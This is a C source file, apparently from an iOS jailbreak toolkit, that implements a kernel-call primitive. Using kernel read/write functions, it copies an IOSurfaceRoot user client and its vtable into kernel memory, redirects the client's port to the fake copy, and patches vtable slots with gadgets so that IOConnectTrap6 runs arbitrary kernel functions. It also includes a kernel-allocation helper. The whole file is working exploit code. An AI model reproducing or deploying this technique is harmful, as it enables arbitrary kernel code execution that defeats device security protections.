//
//  kcall16.c
//  meow
//
//  Created by mizole on 2023/12/21.
//

#import <Foundation/Foundation.h>
#include "kcall16.h"

static uint64_t fake_vtable = 0;
static uint64_t fake_client = 0;
static io_connect_t user_client = 0;

bool setup_client(void) {
    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        printf("Failed to get IOSurfaceRoot service\n");
        return false;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("Failed to open IOSurfaceRoot service\n");
        return false;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    uint64_t userclient_port = ipc_find_port(conn);
    uint64_t userclient_addr = kread64_kfd(userclient_port + off_ipc_port_ip_kobject);
    uint64_t userclient_vtab = kread64_kfd(userclient_addr);

    if (fake_vtable == 0)
        fake_vtable = empty_kdata;
    printf("fake_vtable: %llx\n", fake_vtable);
    usleep(1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_vtab + i * 8);
        kwrite64_kfd(fake_vtable + i * 8, data);
    }

    if (fake_client == 0)
        fake_client = empty_kdata + 0x1000;
    printf("fake_client: %llx\n", fake_client);
    usleep(1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_addr + i * 8);
        kwrite64_kfd(fake_client + i * 8, data);
    }
    
    kwrite64_kfd(fake_client, fake_vtable);
    usleep(1000);
    kwrite64_kfd(userclient_port + 0x48, fake_client);
    usleep(1000);
    kwrite64_kfd(fake_vtable + 8 * 0xB8, add_x0_x0_0x40);
    usleep(1000);
    if(isAvailable() >= 8)
        kwrite64_kfd(fake_vtable + 8 * 0xB9, iogettargetand);
    
    return true;
}

uint64_t eary_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64_kfd(fake_client + 0x40);
    uint64_t offx28 = kread64_kfd(fake_client + 0x48);
    kwrite64_kfd(fake_client + 0x40, x0);
    kwrite64_kfd(fake_client + 0x48, addr);
    
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64_kfd(fake_client + 0x40, offx20);
    kwrite64_kfd(fake_client + 0x48, offx28);
    return kcall_ret;
}

uint64_t eary_kalloc(size_t ksize) {
    uint64_t r = eary_kcall(container_init,
                            container_init != 0 ?
                            container_init  + 0x500 :
        fake_client + 0x200, ksize / 8, 0, 0, 0, 0, 0);
    if (r == 0) return 0;
    uint64_t kmem = kread64_kfd(empty_kdata != 0 ?
                                empty_kdata + 0x500 + 0x20 :
                                fake_client + 0x200 + 0x20);
    return kmem;
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for (int i = 0; i < size; i += 8) {
        kwrite64_kfd(addr + i, 0);
    }
    return 0;
}

bool init_kcall(void) {
    if(!setup_client())
        return false;
    
    /*
    usleep(5000);
    uint64_t kmem = eary_kalloc(0x2000);
    printf("kmem: %llx\n", kmem);
    
    usleep(5000);
    uint64_t r = IOServiceClose(user_client);
    
    uint64_t cleanup_addr = empty_kdata;
    empty_kdata = 0;
    fake_client = kmem;
    fake_vtable = kmem + 0x1000;
    
    usleep(5000);
    clean_dirty_kalloc(cleanup_addr, 0x2000);
    
    if(!setup_client())
        return false;
     */
    return true;
}
